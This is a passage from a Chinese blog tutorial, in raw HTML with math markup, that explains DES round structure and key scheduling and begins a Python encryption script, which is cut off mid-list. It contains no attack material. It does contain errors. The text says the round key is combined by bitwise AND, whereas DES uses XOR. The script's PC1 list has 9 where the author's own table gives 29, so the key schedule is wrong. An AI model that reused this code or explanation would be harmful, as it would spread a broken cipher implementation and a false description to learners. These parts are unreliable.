style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">R_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>有了，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">L_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>怎么来呢？左半部分全程摸鱼，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">L_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>直接等于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>哈哈。</p><p>以下为DES一轮的流程图。</p><p><img src="https://upyun.wuuconix.link/image-20210914220157190.png" alt="DES一轮" /></p><p>连续经过16轮这样一样的操作，最后得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">L_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">R_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。把这两个32位二进制位拼接起来 ，但是这里要注意 ，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">R_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>要拼在前面 ，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>16</mn></msub><mo>+</mo><msub><mi>L</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">R_{16}+L_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。我们可以这样理解，这16轮，左半部分全程划水，右半部分奋力拼搏，所以最后把右半部分放在前面以资鼓励2333。</p><p>拼接完成得到64位二进制位，这个64位二进制位最后再做一个<code>逆初始置换 Reverse Initial Permutation</code>，这个置换是初始置换的逆。</p><p>转置好了就得到 我们的64位密文啦！</p><p>以上讲了明文到密文的过程。但是还没有将密钥是如何生成的。刚刚我们讲到和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>做与运算的密钥是48位的，那我们输入的64位密钥是怎么变成每轮的48位密钥 的呢？先把流程图放这里吧。</p><p><img src="https://upyun.wuuconix.link/image-20210914221333071.png" alt="密钥生成" /></p><p>64位密钥输入，首先经过一个叫<code>PC1 Permuted Choice 1</code>的置换。这个置换会把<code>8,16,24..</code>的位数丢失。以下是PC1的具体内容。</p><div class="center"><table><thead><tr><th style="text-align:center">57</th><th style="text-align:center">49</th><th style="text-align:center">41</th><th style="text-align:center">33</th><th style="text-align:center">25</th><th style="text-align:center">17</th><th style="text-align:center">9</th><th style="text-align:center">1</th></tr></thead><tbody><tr><td style="text-align:center">58</td><td style="text-align:center">50</td><td style="text-align:center">42</td><td style="text-align:center">34</td><td style="text-align:center">26</td><td style="text-align:center">18</td><td style="text-align:center">10</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">59</td><td style="text-align:center">51</td><td style="text-align:center">43</td><td style="text-align:center">35</td><td style="text-align:center">27</td><td style="text-align:center">19</td><td style="text-align:center">11</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">60</td><td style="text-align:center">52</td><td style="text-align:center">44</td><td style="text-align:center">36</td><td style="text-align:center">63</td><td style="text-align:center">55</td><td style="text-align:center">47</td><td style="text-align:center">39</td></tr><tr><td style="text-align:center">31</td><td style="text-align:center">23</td><td style="text-align:center">15</td><td style="text-align:center">7</td><td style="text-align:center">62</td><td style="text-align:center">54</td><td style="text-align:center">46</td><td style="text-align:center">38</td></tr><tr><td style="text-align:center">30</td><td style="text-align:center">22</td><td style="text-align:center">14</td><td style="text-align:center">6</td><td style="text-align:center">61</td><td style="text-align:center">53</td><td style="text-align:center">45</td><td style="text-align:center">37</td></tr><tr><td style="text-align:center">29</td><td style="text-align:center">21</td><td style="text-align:center">13</td><td style="text-align:center">5</td><td style="text-align:center">28</td><td style="text-align:center">20</td><td style="text-align:center">12</td><td style="text-align:center">4</td></tr></tbody></table></div><p>我们可以发现它是7行8列，一共56个元素，并且仔细观察的话，是没有<code>8</code>的倍数的值的，这就导致原始64位密钥的8倍数的下标的值被丢弃，最终成为56位。</p><p>得到的56位二进制数，我们还是把它分为左右两个部分，分别叫<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>D</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">D_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>D</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">D_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>需要分别进行循环左移。左移几位呢？我们需要按照这个表来行动。</p><p><img src="https://upyun.wuuconix.link/image-20210914222112960.png" alt="密钥移动的位数" /></p><p>我们可以看到是左移1位。我们将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>D</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">D_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>分别循环左移一位后，再将两者合并，再进行 一次<code>PC2 Permuted Choice 2</code>的置换。这个置换将56位又减少为48位。以下是PC2的值。</p><div class="center"><table><thead><tr><th style="text-align:center">14</th><th style="text-align:center">17</th><th style="text-align:center">11</th><th style="text-align:center">24</th><th style="text-align:center">1</th><th style="text-align:center">5</th></tr></thead><tbody><tr><td style="text-align:center">3</td><td style="text-align:center">28</td><td style="text-align:center">15</td><td style="text-align:center">6</td><td style="text-align:center">21</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center">19</td><td style="text-align:center">12</td><td style="text-align:center">4</td><td style="text-align:center">26</td><td style="text-align:center">8</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center">7</td><td style="text-align:center">27</td><td style="text-align:center">20</td><td style="text-align:center">13</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">41</td><td style="text-align:center">52</td><td style="text-align:center">31</td><td style="text-align:center">37</td><td style="text-align:center">47</td><td style="text-align:center">55</td></tr><tr><td style="text-align:center">30</td><td style="text-align:center">40</td><td style="text-align:center">51</td><td style="text-align:center">45</td><td style="text-align:center">33</td><td style="text-align:center">48</td></tr><tr><td style="text-align:center">44</td><td style="text-align:center">49</td><td style="text-align:center">39</td><td style="text-align:center">56</td><td style="text-align:center">34</td><td style="text-align:center">53</td></tr><tr><td style="text-align:center">46</td><td style="text-align:center">42</td><td style="text-align:center">50</td><td style="text-align:center">36</td><td style="text-align:center">29</td><td style="text-align:center">32</td></tr></tbody></table></div><p>是8行6列的，一共48位元素。我们可以发现原56位二进制中的<code>9，18，22，25，35，38，43，54</code>不在此表中，被丢弃。</p><p>经过这个PC2得到的48位将成为第一轮密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">K_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">R_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>转化为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>R</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">R_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>过程中发挥作用。</p><p>以上就是DES的全部原理了，看似很复杂，但是实际上还是比较简单的，无非就是置换、代替、按位与，然后轮数多了点，人手算那肯定是要命的。现代密码就需要用计算机来实现加密和解密。下面我来分析一下加密和解密的脚本编写的难点。</p><p>明文和密钥的初始值都是64位的，我们肯定不能写64个01，那太麻烦了，而且那样也没啥意思，加密算法是让我们用来加密某种有意义的信息的，所以我们这里用8个字符来作为明文，8个字符来作为密文。比如我们的明文就是8个字符的字符串<code>wuuconix</code>。要怎么把它转化为64位二进制位呢？实际上也非常简单，每个字符都ascii码值，我们直接把它的二进制码值转化为二进制位就行了，但是由于ascii码一共只有127个，也就是最多7位二进制，所以前面需要手动补零。有些ascii码小的字母缺的位数可能大于1个，我们需要补零补到8位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;0&quot;</span> + <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;w&#x27;</span>))[<span class="hljs-number">2</span>:]<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210914223615595.png" alt="ascii转二进制" /></p><p>然后我们还需要解决的一个问题就是置换如何实现。在许多参考资料中，置换表都是一个方块，那是不是需要用一个二维列表来存储呢？</p><p><img src="https://upyun.wuuconix.link/image-20210914223857121.png" alt="Extended Permutation" /></p><p>其实不用，经过我的实验，直接把置换表写成一行反而更加清楚。</p><p>这里我举一个例子，为了观察方便 ，就不用01了。</p><p>输入<code>abcd</code>。置换表为<code>2 3 1 4</code>。这个置换表里的值是什么意思呢？其实就是在输入字符串里的字符下标，分别取出第二位<code>b</code>，第一位<code>a</code>，依次类推，我们将取出来的字符进行合并，就得到了<code>bcad</code>。这就是置换结果了，十分方便。所有的置换表都可以这要来考虑，写出来的脚本也非常简单易懂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">permutation_table = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>]<br><span class="hljs-built_in">input</span> = <span class="hljs-string">&quot;abcd&quot;</span><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permutation_table:<br>output += <span class="hljs-built_in">input</span>[i - <span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210914224741664.png" alt="result" /></p><p>置换就是这么简单，就是遍历置换表的值，拿到下标，从输入字符串对应下标出拿到字母加入到输出字符串中。</p><p>以上就是我认为的脚本实现DES的难点了，其他的就十分简单了。以下是DES加密和解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_bin</span>(<span class="hljs-params">alpha, mod</span>):<br>    alpha_bin = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> (mod == <span class="hljs-string">&quot;encode&quot;</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alpha :<br>            bit = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&quot;0b&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">len</span>(bit) &lt; <span class="hljs-number">8</span>): <span class="hljs-comment">#有些ascii不足7位，在前面补零</span><br>                bit = <span class="hljs-string">&quot;0&quot;</span> + bit<br>            alpha_bin += bit<br>    <span class="hljs-keyword">elif</span> (mod == <span class="hljs-string">&quot;decode&quot;</span>):<br>        alpha_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(alpha, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]<br>        <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(alpha_bin) &lt; <span class="hljs-number">64</span>):<br>            alpha_bin = <span class="hljs-string">&quot;0&quot;</span> + alpha_bin<br>    <span class="hljs-keyword">return</span> alpha_bin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>(<span class="hljs-params">key_alpha</span>):<br>    <span class="hljs-comment">#key_alpha表示密钥的字母形态</span><br>    pc1 = [ <span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,<span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">9</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span> ]<br>    pc2 = [ <span class="hljs-number">14</span>,<span class="hljs-number">17</span>,<span class="hljs-number">11</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">28</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">21</span>,<span class="hljs-number">10</span>,<span class="hljs-number">23</span>,<span class="hljs-number">19</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">26</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">27</span>,<span 